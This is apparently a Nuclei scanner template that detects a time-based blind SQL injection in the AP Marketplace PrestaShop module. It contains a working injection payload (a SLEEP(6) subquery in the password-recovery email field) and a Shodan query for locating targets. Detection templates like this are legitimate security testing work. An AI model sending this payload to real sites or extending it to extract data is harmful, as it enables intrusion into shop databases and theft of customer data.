http:
- host-redirects: true
  matchers:
  - condition: and
    dsl:
    - duration>=6
    - contains(body, "module-apmarketplace-passwordrecovery")
    type: dsl
  max-redirects: 3
  raw:
  - '@timeout: 20s

    POST /m/apmarketplace/passwordrecovery HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    Referer: {{RootURL}}

    X-Requested-With: XMLHttpRequest


    email="+AND+(SELECT+3472+FROM+(SELECT(SLEEP(6)))UTQK)--+IGIe&submit_reset_pwd=

    '
id: prestashop-apmarketplace-sqli
info:
  author: mastercho
  description: 'The AP Marketplace Prestashop module is vulnerable to Blind/Time SQL
    Injection. An attacker can exploit this vulnerability to execute arbitrary SQL
    queries on the underlying database.

    '
  metadata:
    shodan-query: http.component:"Prestashop"
    verified: true
  name: PrestaShop Ap Marketplace - SQL Injection
  reference:
  - https://www.openservis.cz/prestashop-blog/nejcastejsi-utoky-v-roce-2023-seznam-deravych-modulu-nemate-nejaky-z-nich-na-e-shopu-i-vy/#pll_switcher
  severity: high
  tags: time-based-sqli,prestashop,sqli,vuln
